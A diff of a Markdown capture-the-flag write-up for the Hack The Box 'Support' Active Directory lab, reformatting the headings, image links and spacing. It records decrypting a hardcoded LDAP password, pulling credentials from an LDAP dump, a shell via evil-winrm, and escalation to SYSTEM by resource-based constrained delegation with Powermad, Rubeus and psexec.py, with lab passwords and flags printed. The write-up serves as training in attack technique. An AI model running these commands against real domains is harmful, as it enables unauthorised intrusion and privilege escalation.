@@ -1,13 +1,16 @@
 ---
 sticker: emoji//1f469-200d-1f4bb
 ---
-# ENUMERATION
----
 
+# SUPPORT
 
+## ENUMERATION
 
-## OPEN PORTS
----
+***
+
+### OPEN PORTS
+
+***
 
 | Port     | Service                                                                                               |
 | -------- | ----------------------------------------------------------------------------------------------------- |
@@ -18,24 +21,23 @@ sticker: emoji//1f469-200d-1f4bb
 | 389/tcp  | ldap (Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)) |
 | 445/tcp  | microsoft-ds?                                                                                         |
 | 464/tcp  | kpasswd5?                                                                                             |
-| 593/tcp  | ncacn_http (Microsoft Windows RPC over HTTP 1.0)                                                      |
+| 593/tcp  | ncacn\_http (Microsoft Windows RPC over HTTP 1.0)                                                     |
 | 636/tcp  | tcpwrapped                                                                                            |
 | 3268/tcp | ldap (Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)) |
 | 3269/tcp | tcpwrapped                                                                                            |
 | 5985/tcp | http (Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP))                                                        |
 
+## RECONNAISSANCE
 
-# RECONNAISSANCE
----
+***
 
 We got SMB enabled, let's check if anonymous login is enabled:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250421130457.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250421130457.png)
 
 We got some shares, most interesting one is `support-tools` one, let's check it out:
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250421130627.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250421130627.png)
 
 We got some common tools but there is one file that is not one of them:
 
@@ -43,22 +45,21 @@ We got some common tools but there is one file that is not one of them:
 UserInfo.exe.zip
 ```
 
-
 Let's get it on our local machine and analyze it:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250421130853.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250421130853.png)
 
 We got a bunch of files, since we got a `.exe`, we can use `ILSPY` to perform reverse engineering in order to find anything valuable:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250421132553.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250421132553.png)
 
 There's an `ldapQuery()` function which seems to be interesting it uses `getPassword` function, maybe we can find some credentials if we look further:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250421132710.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250421132710.png)
 
 We got something called `enc_password`:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250421132746.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250421132746.png)
 
 There we go, we got a password, since it is encrypted, we can craft a simple python script to decrypt it:
 
@@ -85,7 +86,6 @@ password = decrypt_password(encrypted_password, decryption_key)
 print(f"Decrypted password: {password}")
 ```
 
-
 If we run the script, we get this:
 
 ```
@@ -95,9 +95,9 @@ Decrypted password: nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 
 Nice, with the credentials, we can now proceed to exploitation.
 
+## EXPLOITATION
 
-# EXPLOITATION
----
+***
 
 With previous enumeration, we found:
 
@@ -113,7 +113,6 @@ SMB         support.htb     445    DC               [*] Windows Server 2022 Buil
 SMB         support.htb     445    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
 ```
 
-
 As we can see, the credentials work, we can use `ldapsearch` to show all the items in the `AD`:
 
 ```bash
@@ -122,7 +121,7 @@ ldapsearch -H ldap://support.htb -x -D 'ldap@support.htb' -w 'nvEfEK16^1aM4$e7Ac
 
 Since it outputs us a lot of stuff, we can either use grep or submit the output to a file and analyze it with a code editor, I analyzed it with `vscode` and found this:
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250421135556.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250421135556.png)
 
 We got a password for an user named `support`:
 
@@ -130,15 +129,13 @@ We got a password for an user named `support`:
 support:Ironside47pleasure40Watchful
 ```
 
-
 We can use `evil-winrm` to get a shell:
 
 ```bash
 evil-winrm -i 'support.htb' -u 'support' -p 'Ironside47pleasure40Watchful'
 ```
 
-
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250421135830.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250421135830.png)
 
 With this shell, we can get `user.txt`:
 
@@ -147,12 +144,11 @@ With this shell, we can get `user.txt`:
 6fd2da1463398ae6580fe963dbbe4dc1
 ```
 
-
 Let's begin privilege escalation.
 
+## PRIVILEGE ESCALATION
 
-# PRIVILEGE ESCALATION
----
+***
 
 First step would be checking our privileges using bloodhound:
 
@@ -160,11 +156,10 @@ First step would be checking our privileges using bloodhound:
 bloodhound-python -c ALL -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb -ns 10.10.11.174
 ```
 
-If we analyze the data with bloodhound, we can realize that `support` has `GenericAll` on the computer object, knowing this, This privilege grants full control over the object, enabling the modification of critical security attributes, we can use some tools to exploit this, we can use these three tools:
-
+If we analyze the data with bloodhound, we can realize that `support` has `GenericAll` on the computer object, knowing this, This privilege grants full control over the object, enabling the modification of critical security attributes, we can use some tools to exploit this, we can use these three tools:
 
 1. [Powerview.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1)
-2. [PowerMad.ps1](- [PowerMad.ps1](https://github.com/Kevin-Robertson/Powermad))
+2. \[PowerMad.ps1]\(- [PowerMad.ps1](https://github.com/Kevin-Robertson/Powermad))
 3. [Rubeus.exe](https://github.com/GhostPack/Rubeus)
 
 Once we got them, upload them using the `upload` functionality on `evil-winrm` and import them:
@@ -182,7 +177,7 @@ Now, we can proceed with the exploitation, let's do the following:
 New-MachineAccount -MachineAccount PWNED -Password $(ConvertTo-SecureString 'Password123' -AsPlainText -Force)
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250421164453.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250421164453.png)
 
 2. Set `msds-AllowedToActOnBehalfOfOtherIdentity`:
 
@@ -306,7 +301,7 @@ Now, we can use `psexec.py` to get a shell:
 python3 psexec.py support.htb/administrator@dc.support.htb -k -no-pass
 ```
 
-![](gitbook/cybersecurity/images/Pasted%252520image%25252020250421165540.png)
+![](gitbook/cybersecurity/images/Pasted%20image%2020250421165540.png)
 
 As we can see, we got our shell as `nt authority/system` and can finally read `root.txt`:
 
@@ -316,4 +311,3 @@ C:\Users\Administrator\Desktop> type root.txt
 ```
 
 https://www.hackthebox.com/achievement/machine/1872557/484
-
